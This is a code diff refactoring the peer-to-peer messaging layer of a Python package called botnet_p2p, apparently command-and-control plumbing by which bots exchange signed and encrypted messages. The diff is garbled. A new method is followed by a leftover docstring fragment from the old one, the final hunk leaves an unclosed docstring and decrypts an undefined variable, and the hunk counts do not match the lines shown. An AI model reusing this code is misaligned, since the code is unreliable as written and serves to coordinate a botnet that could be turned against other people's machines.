@@ -11,8 +11,14 @@ from botnet_p2p import (
     MSG_SIGNEDHASH_SEPARATOR,
     logger,
 )
-from botnet_p2p.security import sign_hash, calculate_hash, verify_message, encrypt, decrypt
-from botnet_p2p.message import get_msg_data, get_msg_type, get_signed_hash
+from botnet_p2p.security import (
+    sign_hash,
+    calculate_hash,
+    verify_message,
+    encrypt,
+    decrypt,
+)
+from botnet_p2p.message import Message
 
 address = Tuple[str, int]
 
@@ -62,8 +68,9 @@ class NodeP2P(object):
     def close(self):
         self.__socket.close()
 
-    def set_private_key_path(self, private_key_path: str):
-        """ Change private key path in case we want to use a different one 
+    def send_signed_msg(self, msg_type: int, msg: str):
+        new_msg = Message(msg_type=msg_type, msg=msg)
+        final_msg = new_msg.sign_msg(self.__private_key_path)
 
             Args:
                 private_key_path: Path were private key is located
@@ -80,17 +87,21 @@ class NodeP2P(object):
 
     def recv_signed_msg(self) -> (int, str, bool):
         raw_msg = self.__socket.recv(BUFFER_SIZE)
-        msg_type, msg_data, signed_hash = self.__extract_info_from_message(raw_msg)
-        msg_type_data = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg_data}"
-        comes_from_trusted_source = verify_message(
-            self.__public_key_path, msg_type_data, signed_hash
+        received_msg = Message()
+        comes_from_trusted_source = received_msg.from_signed_msg(
+            raw_msg, self.__public_key_path
         )
+
         logger.debug(
             f"Raw message: {raw_msg}"
             + f"Comes from a trusted source? {comes_from_trusted_source}"
         )
-        return msg_type, msg_data, comes_from_trusted_source
     
+        msg_type = received_msg.get_msg_type()
+        msg = received_msg.get_msg_body()
+
+        return msg_type, msg, comes_from_trusted_source
+
     def recv_encrypted_msg(self) -> str:
         encrypted_msg = self.__socket.recv(BUFFER_SIZE)
         plain_msg = decrypt(self.__private_key_path, encrypted_msg)
@@ -100,42 +111,5 @@ class NodeP2P(object):
         """ Build message following a structure so every bot in the P2P
             can understand each other
 
-            Args:
-                msg_type: Type of the message you want to send
-                msg: The message itself
-
-            Returns:
-                Bytes in a structured format
-        """
-        msg = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg}"
-        msg_hash = calculate_hash(msg)
-        signed_hash = sign_hash(msg_hash, self.__private_key_path)
-        final_msg = (
-            msg.encode(ENCODING)
-            + f"{MSG_SIGNEDHASH_SEPARATOR}".encode(ENCODING)
-            + signed_hash
-        )
-        return final_msg
-
-    def __extract_info_from_message(self, raw_msg: bytes) -> (int, str, bytes):
-        """ Extract relevant fields from the received message knowing it
-            follows a specific structure
-
-            Args:
-                msg: Message in bytes
-
-            Returns:
-                The characteristic fields of the message:
-                message type, data and hash
-        """
-        raw_msg_str = raw_msg.decode(ENCODING)
-        msg_type = get_msg_type(raw_msg_str)
-        msg_data = get_msg_data(raw_msg_str)
-        signed_hash = get_signed_hash(raw_msg_str)
-        logger.debug(
-            f"  Message received: \n"
-            + f"  Message type: {msg_type}\n"
-            + f"  Message: {msg_data}\n"
-            + f"  Signed hash: {signed_hash}\n\n"
-        )
-        return msg_type, msg_data, signed_hash
+        plain_msg = decrypt(self.__private_key_path, encrypted_msg)
+        return plain_msg
